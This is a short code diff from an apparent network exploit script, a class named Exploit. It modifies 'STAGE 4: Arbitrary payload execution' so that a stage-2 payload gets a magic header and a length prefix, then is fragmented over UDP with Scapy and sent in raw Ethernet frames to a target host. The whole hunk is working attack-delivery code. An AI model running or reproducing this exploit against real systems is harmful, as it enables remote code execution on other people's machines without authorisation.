@@ -813,9 +813,10 @@ class Exploit():
         print('[+] STAGE 4: Arbitrary payload execution')
 
         print('[*] Sending stage2 payload...')
+        payload = 'PAYL'.encode() + len(self.stage2).to_bytes(4, byteorder = 'little') + self.stage2;
         frags = fragment(
             IP(src=self.SOURCE_IPV4, dst=self.TARGET_IPV4) /
-            UDP(dport=self.STAGE2_PORT) / self.stage2, 1024)
+            UDP(dport=self.STAGE2_PORT) / payload, 1024)
 
         for frag in frags:
             self.s.send(Ether(src=self.source_mac, dst=self.target_mac) / frag)
